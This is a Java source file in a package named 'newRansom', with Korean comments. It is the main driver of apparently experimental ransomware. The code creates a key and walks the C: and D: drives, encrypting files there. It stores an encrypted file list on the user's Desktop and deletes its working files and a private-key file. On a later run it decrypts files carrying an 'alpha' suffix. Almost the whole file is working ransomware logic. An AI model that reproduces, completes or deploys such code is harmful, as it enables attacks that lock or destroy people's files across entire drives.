package newRansom;

import java.awt.Desktop;
import java.io.File;
import java.util.ArrayList;
import java.util.Map;

import java.net.URL;
import java.net.URLClassLoader;

import newRansom.CipInterface;
import newRansom.Cip;


public class Main {
	static CipInterface cip = new Cip();
	static FileSearch fs = new FileSearch();
	static boolean isencrypt=true;
	static Map<String, String> list;
	
	public static void main(String[] args) throws Exception {
		String desktoppass = System.getProperty("user.home")+File.separator+"Desktop"+File.separator;

		cip.CreateKey();
		
		File[] roots = File.listRoots();
		
		// 하드로부터 모든 파일을 읽어온다.
		if(cip.CreateReadFile(desktoppass, "read.txt")) {
			for(int i = 0; i < roots.length; i++)
        	{
			 	if(roots[i].getPath().equals("C:"+File.separator)
					|| roots[i].getPath().equals("D:"+File.separator))
			 	{
				 	fs.setDefaultDirectory(roots[i].getPath());
				 	boolean temp = EncryptAllFile(100); 
				 
				 	if(!temp) isencrypt = temp;
			 	}
        	}

			list =  cip.ReturnList();

			if(!list.isEmpty()) 
			{
				cip.CreateListFile(desktoppass);
				cip.ListEncrypt(desktoppass, "list");
			}
			if(isencrypt)
			{
				System.out.println("암호화 complete!!!!!!!!");
			}
		}
		// 만약 이미 암호화 되어있다면 복호화한다.
		else {
			for(int i = 0; i < roots.length; i++)
        	{
			 	if(roots[i].getPath().equals("C:"+File.separator)
					|| roots[i].getPath().equals("D:"+File.separator))
			 	{
			 		cip.ListDecryte(desktoppass, "list.alpha");
			 		cip.ReadListFile(desktoppass);
				 	fs.setDefaultDirectory(roots[i].getPath());
				 	boolean temp = DencryptAllFile();
				 
//				 	if(!temp) isencrypt = temp;
			 	}
        	}
		}
		
		File f = new File(desktoppass+"read.txt");
		File fl = new File(desktoppass+"list");
		File f2 = new File(desktoppass+"EprivateKey.txt");
		f.delete();
		fl.delete();
		f2.delete();
		
		
	}
	
	// 리스트에 저장되 있는 모든 파일을 암호화한다.
	public static boolean EncryptAllFile(int n) { 
		int count = 0;
		// 리스트에서 파일 하나하나 꺼내와서 암호화.
		try {
			ArrayList<File> list = fs.allFileSearch();

			for (int i = 0; i < list.size(); i++) {
				cip.FileEncrypt(list.get(i).getParent() + "\\", list.get(i).getName()); //현재 파일을 보낸다.
				count++;
				if(count > n) return true;
			}
			return true;
		}
		catch(Exception e) 
		{
			return false;
		}
		
	}
	
	// 리스트에 저장되 있는 모든 파일을 복호화한다.
	public static boolean DencryptAllFile() {
		// 리스트에서 파일 하나하나 꺼내와서 암호화.
		try {
			ArrayList<File> list = fs.alphaFileSearch();
			for (int i = 0; i < list.size(); i++) {
				System.out.println(list.get(i).getParent());
				System.out.println(list.get(i).getName());
				if(list.get(i).getName().substring((list.get(i).getName().length()-5)).equals("alpha"))
				{
					// 복호화 어떤게 됬는지 출력
					//	System.out.println(list.get(i).getName()+"복호화");
					cip.FileDecryte(list.get(i).getParent() + "\\", list.get(i).getName());
				}
			
			}
		return true;
		}
		catch(Exception e) 
		{
			return false;
		}
	}
}
